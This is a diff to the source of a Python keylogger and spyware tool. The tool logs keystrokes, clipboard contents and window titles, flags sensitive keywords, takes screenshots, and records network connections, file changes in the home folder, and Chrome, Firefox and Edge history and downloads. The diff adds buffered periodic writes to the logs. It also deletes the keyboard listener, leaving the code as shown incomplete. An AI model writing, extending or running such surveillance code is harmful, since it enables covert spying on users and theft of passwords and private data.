@@ -32,11 +32,13 @@ HOST = socket.gethostname()
 OS_NAME = f"{platform.system()} {platform.release()}"
 try:
     PUBLIC_IP = requests.get("https://api.ipify.org", timeout=5).text
-except:
+except requests.exceptions.RequestException:
     PUBLIC_IP = "Unavailable"
 
 # Key buffer to detect paste
 last_keys = []
+key_log_buffer = []
+KEY_LOG_WRITE_INTERVAL = 5 # seconds
 
 # Ensure key log file has headers
 if not os.path.exists(KEY_LOG_FILE):
@@ -47,6 +49,20 @@ if not os.path.exists(KEY_LOG_FILE):
             "pid", "exe_path", "window_title", "key", "clipboard"
         ])
 
+def write_key_log_buffer():
+    global key_log_buffer
+    if key_log_buffer:
+        with open(KEY_LOG_FILE, "a", newline='', encoding="utf-8") as f:
+            writer = csv.writer(f, quoting=csv.QUOTE_ALL)
+            writer.writerows(key_log_buffer)
+        key_log_buffer = []
+    threading.Timer(KEY_LOG_WRITE_INTERVAL, write_key_log_buffer).start()
+
+
+
+network_log_buffer = []
+NETWORK_LOG_WRITE_INTERVAL = 15 # seconds
+
 # Ensure network log file has headers
 if not os.path.exists(NETWORK_LOG_FILE):
     with open(NETWORK_LOG_FILE, "w", newline='', encoding="utf-8") as f:
@@ -55,17 +71,50 @@ if not os.path.exists(NETWORK_LOG_FILE):
             "timestamp", "pid", "process_name", "local_address", "remote_address", "status"
         ])
 
+def write_network_log_buffer():
+    global network_log_buffer
+    if network_log_buffer:
+        with open(NETWORK_LOG_FILE, "a", newline='', encoding="utf-8") as f:
+            writer = csv.writer(f, quoting=csv.QUOTE_ALL)
+            writer.writerows(network_log_buffer)
+        network_log_buffer = []
+    threading.Timer(NETWORK_LOG_WRITE_INTERVAL, write_network_log_buffer).start()
+
+browser_log_buffer = []
+BROWSER_LOG_WRITE_INTERVAL = 60 # seconds
+
 # Ensure browser history log file has headers
 if not os.path.exists(BROWSER_LOG_FILE):
     with open(BROWSER_LOG_FILE, "w", newline='', encoding="utf-8") as f:
         writer = csv.writer(f, quoting=csv.QUOTE_ALL)
         writer.writerow(["timestamp", "source", "title", "url", "visit_count", "last_visit_time"])
 
+def write_browser_log_buffer():
+    global browser_log_buffer
+    if browser_log_buffer:
+        with open(BROWSER_LOG_FILE, "a", newline='', encoding="utf-8") as f:
+            writer = csv.writer(f, quoting=csv.QUOTE_ALL)
+            writer.writerows(browser_log_buffer)
+        browser_log_buffer = []
+    threading.Timer(BROWSER_LOG_WRITE_INTERVAL, write_browser_log_buffer).start()
+
+filesystem_log_buffer = []
+FILESYSTEM_LOG_WRITE_INTERVAL = 10 # seconds
+
 # Ensure filesystem log file has headers
 if not os.path.exists(FILESYSTEM_LOG_FILE):
     with open(FILESYSTEM_LOG_FILE, "w", newline='', encoding="utf-8") as f:
         writer = csv.writer(f, quoting=csv.QUOTE_ALL)
         writer.writerow(["timestamp", "event_type", "src_path", "dest_path", "is_directory"])
+
+def write_filesystem_log_buffer():
+    global filesystem_log_buffer
+    if filesystem_log_buffer:
+        with open(FILESYSTEM_LOG_FILE, "a", newline='', encoding="utf-8") as f:
+            writer = csv.writer(f, quoting=csv.QUOTE_ALL)
+            writer.writerows(filesystem_log_buffer)
+        filesystem_log_buffer = []
+    threading.Timer(FILESYSTEM_LOG_WRITE_INTERVAL, write_filesystem_log_buffer).start()
 
 def get_active_window_info():
     try:
@@ -80,24 +129,25 @@ def get_active_window_info():
 def log_network_activity():
     while True:
         try:
-            with open(NETWORK_LOG_FILE, "a", newline='', encoding="utf-8") as f:
-                writer = csv.writer(f, quoting=csv.QUOTE_ALL)
-                for conn in psutil.net_connections(kind='inet'):
-                    if conn.status == 'ESTABLISHED' and conn.raddr:
-                        try:
-                            proc = psutil.Process(conn.pid)
-                            proc_name = proc.name()
-                        except (psutil.NoSuchProcess, psutil.AccessDenied):
-                            proc_name = "N/A"
-                        
-                        writer.writerow([
-                            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                            conn.pid,
-                            proc_name,
-                            f"{conn.laddr.ip}:{conn.laddr.port}",
-                            f"{conn.raddr.ip}:{conn.raddr.port}",
-                            conn.status
-                        ])
+            current_network_logs = []
+            for conn in psutil.net_connections(kind='inet'):
+                if conn.status == 'ESTABLISHED' and conn.raddr:
+                    try:
+                        proc = psutil.Process(conn.pid)
+                        proc_name = proc.name()
+                    except (psutil.NoSuchProcess, psutil.AccessDenied):
+                        proc_name = "N/A"
+                    
+                    current_network_logs.append([
+                        datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                        conn.pid,
+                        proc_name,
+                        f"{conn.laddr.ip}:{conn.laddr.port}",
+                        f"{conn.raddr.ip}:{conn.raddr.port}",
+                        conn.status
+                    ])
+            global network_log_buffer
+            network_log_buffer.extend(current_network_logs)
         except Exception as e:
             print(f"[!] Error logging network activity: {e}")
         
@@ -120,122 +170,123 @@ def capture_screenshot():
 def log_browser_history():
     while True:
         try:
-            with open(BROWSER_LOG_FILE, "a", newline='', encoding="utf-8") as f:
-                writer = csv.writer(f, quoting=csv.QUOTE_ALL)
+            current_browser_logs = []
 
-                # --- Chrome History ---
-                chrome_history_path = os.path.expanduser("~/.config/google-chrome/Default/History")
-                if os.path.exists(chrome_history_path):
-                    temp_chrome_history_path = os.path.join(LOG_DIR, "ChromeHistory.db")
-                    shutil.copy2(chrome_history_path, temp_chrome_history_path)
-                    try:
-                        with sqlite3.connect(temp_chrome_history_path) as conn:
-                            cursor = conn.cursor()
-                            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
-                            for row in cursor.fetchall():
-                                last_visit_time = ""
-                                if row[3] is not None:
-                                    try:
-                                        last_visit_time = datetime.fromtimestamp(row[3] / 1000000 - 11644473600)
-                                    except (TypeError, ValueError):
-                                        pass
-                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Chrome History", row[1], row[0], row[2], last_visit_time])
-                            cursor.execute("SELECT tab_url, target_path, total_bytes, start_time FROM downloads")
-                            for row in cursor.fetchall():
-                                start_time = ""
-                                if row[3] is not None:
-                                    try:
-                                        start_time = datetime.fromtimestamp(row[3] / 1000000 - 11644473600)
-                                    except (TypeError, ValueError):
-                                        pass
-                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Chrome Download", os.path.basename(row[1]), row[0], f"{row[2]} bytes", start_time])
-                    except Exception as e:
-                        print(f"[!] Error reading Chrome history: {e}")
-                    finally:
-                        if os.path.exists(temp_chrome_history_path):
-                            os.remove(temp_chrome_history_path)
-
-                # --- Firefox History ---
-                firefox_profiles_path = os.path.expanduser("~/.mozilla/firefox/")
-                if os.path.exists(firefox_profiles_path):
-                    for profile in os.listdir(firefox_profiles_path):
-                        if ".default" in profile: # Find default profile
-                            firefox_history_path = os.path.join(firefox_profiles_path, profile, "places.sqlite")
-                            firefox_downloads_path = os.path.join(firefox_profiles_path, profile, "downloads.sqlite")
-
-                            if os.path.exists(firefox_history_path):
-                                temp_firefox_history_path = os.path.join(LOG_DIR, "FirefoxHistory.db")
-                                shutil.copy2(firefox_history_path, temp_firefox_history_path)
+            # --- Chrome History ---
+            chrome_history_path = os.path.expanduser("~/.config/google-chrome/Default/History")
+            if os.path.exists(chrome_history_path):
+                temp_chrome_history_path = os.path.join(LOG_DIR, "ChromeHistory.db")
+                shutil.copy2(chrome_history_path, temp_chrome_history_path)
+                try:
+                    with sqlite3.connect(temp_chrome_history_path) as conn:
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
+                        for row in cursor.fetchall():
+                            last_visit_time = ""
+                            if row[3] is not None:
                                 try:
-                                    with sqlite3.connect(temp_firefox_history_path) as conn:
-                                        cursor = conn.cursor()
-                                        cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places")
-                                        for row in cursor.fetchall():
-                                            last_visit_date = ""
-                                            if row[3] is not None:
-                                                try:
-                                                    last_visit_date = datetime.fromtimestamp(row[3] / 1000000)
-                                                except (TypeError, ValueError):
-                                                    pass
-                                            writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Firefox History", row[1], row[0], row[2], last_visit_date])
-                                except Exception as e:
-                                    print(f"[!] Error reading Firefox history: {e}")
-                                finally:
-                                    if os.path.exists(temp_firefox_history_path):
-                                        os.remove(temp_firefox_history_path)
-                            
-                            if os.path.exists(firefox_downloads_path):
-                                temp_firefox_downloads_path = os.path.join(LOG_DIR, "FirefoxDownloads.db")
-                                shutil.copy2(firefox_downloads_path, temp_firefox_downloads_path)
+                                    last_visit_time = datetime.fromtimestamp(row[3] / 1000000 - 11644473600)
+                                except (TypeError, ValueError):
+                                    pass
+                            current_browser_logs.append([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Chrome History", row[1], row[0], row[2], last_visit_time])
+                        cursor.execute("SELECT tab_url, target_path, total_bytes, start_time FROM downloads")
+                        for row in cursor.fetchall():
+                            start_time = ""
+                            if row[3] is not None:
                                 try:
-                                    with sqlite3.connect(temp_firefox_downloads_path) as conn:
-                                        cursor = conn.cursor()
-                                        cursor.execute("SELECT content.url, content.suggestedFileName, content.totalBytes, content.startTime FROM moz_downloads AS content")
-                                        for row in cursor.fetchall():
-                                            start_time = ""
-                                            if row[3] is not None:
-                                                try:
-                                                    start_time = datetime.fromtimestamp(row[3] / 1000000)
-                                                except (TypeError, ValueError):
-                                                    pass
-                                            writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Firefox Download", row[1], row[0], f"{row[2]} bytes", start_time])
-                                except Exception as e:
-                                    print(f"[!] Error reading Firefox downloads: {e}")
-                                finally:
-                                    if os.path.exists(temp_firefox_downloads_path):
-                                        os.remove(temp_firefox_downloads_path)
+                                    start_time = datetime.fromtimestamp(row[3] / 1000000 - 11644473600)
+                                except (TypeError, ValueError):
+                                    pass
+                            current_browser_logs.append([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Chrome Download", os.path.basename(row[1]), row[0], f"{row[2]} bytes", start_time])
+                except Exception as e:
+                    print(f"[!] Error reading Chrome history: {e}")
+                finally:
+                    if os.path.exists(temp_chrome_history_path):
+                        os.remove(temp_chrome_history_path)
 
-                # --- Edge History (similar to Chrome) ---
-                edge_history_path = os.path.expanduser("~/.config/microsoft-edge/Default/History")
-                if os.path.exists(edge_history_path):
-                    temp_edge_history_path = os.path.join(LOG_DIR, "EdgeHistory.db")
-                    shutil.copy2(edge_history_path, temp_edge_history_path)
-                    try:
-                        with sqlite3.connect(temp_edge_history_path) as conn:
-                            cursor = conn.cursor()
-                            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
-                            for row in cursor.fetchall():
-                                last_visit_time = ""
-                                if row[3] is not None:
-                                    try:
-                                        last_visit_time = datetime.fromtimestamp(row[3] / 1000000 - 11644473600)
-                                    except (TypeError, ValueError):
-                                        pass
-                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Edge History", row[1], row[0], row[2], last_visit_time])
-                            cursor.execute("SELECT tab_url, target_path, total_bytes, start_time FROM downloads")
-                            for row in cursor.fetchall():
-                                start_time = ""
-                                if row[3] is not None:
-                                    try:
-                                        start_time = datetime.fromtimestamp(row[3] / 1000000 - 11644473600)
-                                    except (TypeError, ValueError):
-                                        pass
-                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Edge Download", os.path.basename(row[1]), row[0], f"{row[2]} bytes", start_time])
-                    except Exception as e:
-                        print(f"[!] Error reading Edge history: {e}")
-                    finally:
-                        if os.path.exists(temp_edge_history_path):
-                            os.remove(temp_edge_history_path)
+            # --- Firefox History ---
+            firefox_profiles_path = os.path.expanduser("~/.mozilla/firefox/")
+            if os.path.exists(firefox_profiles_path):
+                for profile in os.listdir(firefox_profiles_path):
+                    if ".default" in profile: # Find default profile
+                        firefox_history_path = os.path.join(firefox_profiles_path, profile, "places.sqlite")
+                        firefox_downloads_path = os.path.join(firefox_profiles_path, profile, "downloads.sqlite")
+
+                        if os.path.exists(firefox_history_path):
+                            temp_firefox_history_path = os.path.join(LOG_DIR, "FirefoxHistory.db")
+                            shutil.copy2(firefox_history_path, temp_firefox_history_path)
+                            try:
+                                with sqlite3.connect(temp_firefox_history_path) as conn:
+                                    cursor = conn.cursor()
+                                    cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places")
+                                    for row in cursor.fetchall():
+                                        last_visit_date = ""
+                                        if row[3] is not None:
+                                            try:
+                                                last_visit_date = datetime.fromtimestamp(row[3] / 1000000)
+                                            except (TypeError, ValueError):
+                                                pass
+                                        current_browser_logs.append([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Firefox History", row[1], row[0], row[2], last_visit_date])
+                            except Exception as e:
+                                print(f"[!] Error reading Firefox history: {e}")
+                            finally:
+                                if os.path.exists(temp_firefox_history_path):
+                                    os.remove(temp_firefox_history_path)
+                        
+                        if os.path.exists(firefox_downloads_path):
+                            temp_firefox_downloads_path = os.path.join(LOG_DIR, "FirefoxDownloads.db")
+                            shutil.copy2(firefox_downloads_path, temp_firefox_downloads_path)
+                            try:
+                                with sqlite3.connect(temp_firefox_downloads_path) as conn:
+                                    cursor = conn.cursor()
+                                    cursor.execute("SELECT content.url, content.suggestedFileName, content.totalBytes, content.startTime FROM moz_downloads AS content")
+                                    for row in cursor.fetchall():
+                                        start_time = ""
+                                        if row[3] is not None:
+                                            try:
+                                                start_time = datetime.fromtimestamp(row[3] / 1000000)
+                                            except (TypeError, ValueError):
+                                                pass
+                                        current_browser_logs.append([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Firefox Download", row[1], row[0], f"{row[2]} bytes", start_time])
+                            except Exception as e:
+                                print(f"[!] Error reading Firefox downloads: {e}")
+                            finally:
+                                if os.path.exists(temp_firefox_downloads_path):
+                                    os.remove(temp_firefox_downloads_path)
+
+            # --- Edge History (similar to Chrome) ---
+            edge_history_path = os.path.expanduser("~/.config/microsoft-edge/Default/History")
+            if os.path.exists(edge_history_path):
+                temp_edge_history_path = os.path.join(LOG_DIR, "EdgeHistory.db")
+                shutil.copy2(edge_history_path, temp_edge_history_path)
+                try:
+                    with sqlite3.connect(temp_edge_history_path) as conn:
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
+                        for row in cursor.fetchall():
+                            last_visit_time = ""
+                            if row[3] is not None:
+                                try:
+                                    last_visit_time = datetime.fromtimestamp(row[3] / 1000000 - 11644473600)
+                                except (TypeError, ValueError):
+                                    pass
+                            current_browser_logs.append([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Edge History", row[1], row[0], row[2], last_visit_time])
+                        cursor.execute("SELECT tab_url, target_path, total_bytes, start_time FROM downloads")
+                        for row in cursor.fetchall():
+                            start_time = ""
+                            if row[3] is not None:
+                                try:
+                                    start_time = datetime.fromtimestamp(row[3] / 1000000 - 11644473600)
+                                except (TypeError, ValueError):
+                                    pass
+                            current_browser_logs.append([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Edge Download", os.path.basename(row[1]), row[0], f"{row[2]} bytes", start_time])
+                except Exception as e:
+                    print(f"[!] Error reading Edge history: {e}")
+                finally:
+                    if os.path.exists(temp_edge_history_path):
+                        os.remove(temp_edge_history_path)
+            global browser_log_buffer
+            browser_log_buffer.extend(current_browser_logs)
 
         except Exception as e:
             print(f"[!] General error logging browser history: {e}")
@@ -243,19 +294,18 @@ def log_browser_history():
         time.sleep(60) # Log every 60 seconds
 
 class FileSystemLogger(FileSystemEventHandler):
-    def __init__(self, log_file):
-        self.log_file = log_file
+    def __init__(self):
+        pass
 
     def _log(self, event_type, src_path, dest_path=None, is_directory=False):
-        with open(self.log_file, "a", newline='', encoding="utf-8") as f:
-            writer = csv.writer(f, quoting=csv.QUOTE_ALL)
-            writer.writerow([
-                datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                event_type,
-                src_path,
-                dest_path if dest_path else "",
-                str(is_directory)
-            ])
+        global filesystem_log_buffer
+        filesystem_log_buffer.append([
+            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            event_type,
+            src_path,
+            dest_path if dest_path else "",
+            str(is_directory)
+        ])
 
     def on_created(self, event):
         self._log("created", event.src_path, is_directory=event.is_directory)
@@ -270,7 +320,7 @@ class FileSystemLogger(FileSystemEventHandler):
         self._log("moved", event.src_path, event.dest_path, is_directory=event.is_directory)
 
 def start_filesystem_monitoring():
-    event_handler = FileSystemLogger(FILESYSTEM_LOG_FILE)
+    event_handler = FileSystemLogger()
     observer = Observer()
     observer.schedule(event_handler, os.path.expanduser("~"), recursive=True)
     observer.start()
@@ -308,10 +358,7 @@ def log_event(key):
         timestamp, USER, PUBLIC_IP, HOST, OS_NAME,
         pid, exe_path, window_title, key_str, clipboard
     ]
-
-    with open(KEY_LOG_FILE, "a", newline='', encoding="utf-8") as f:
-        writer = csv.writer(f, quoting=csv.QUOTE_ALL)
-        writer.writerow(row)
+    key_log_buffer.append(row)
 
     # Check for sensitive keywords
     for keyword in SENSITIVE_KEYWORDS:
@@ -327,6 +374,7 @@ if __name__ == "__main__":
     # Start network logger in a background thread
     network_thread = threading.Thread(target=log_network_activity, daemon=True)
     network_thread.start()
+    write_network_log_buffer()
 
     # Start screenshot capture in a background thread
     screenshot_thread = threading.Thread(target=capture_screenshot, daemon=True)
@@ -335,17 +383,15 @@ if __name__ == "__main__":
     # Start browser history logger in a background thread
     browser_thread = threading.Thread(target=log_browser_history, daemon=True)
     browser_thread.start()
+    write_browser_log_buffer()
 
     # Start filesystem monitoring in a background thread
     filesystem_thread = threading.Thread(target=start_filesystem_monitoring, daemon=True)
     filesystem_thread.start()
+    write_filesystem_log_buffer()
     
     print(f"[+] Keylogger started at {datetime.now()}... Logging to {KEY_LOG_FILE}")
     print(f"[+] Network monitor started... Logging to {NETWORK_LOG_FILE}")
     print(f"[+] Screenshot capture started... Saving to {SCREENSHOT_DIR}")
     print(f"[+] Browser history monitor started... Logging to {BROWSER_LOG_FILE}")
-    print(f"[+] File system monitor started... Logging to {FILESYSTEM_LOG_FILE}")
-
-    with keyboard.Listener(on_press=log_event) as listener:
-        listener.join()
-
+    
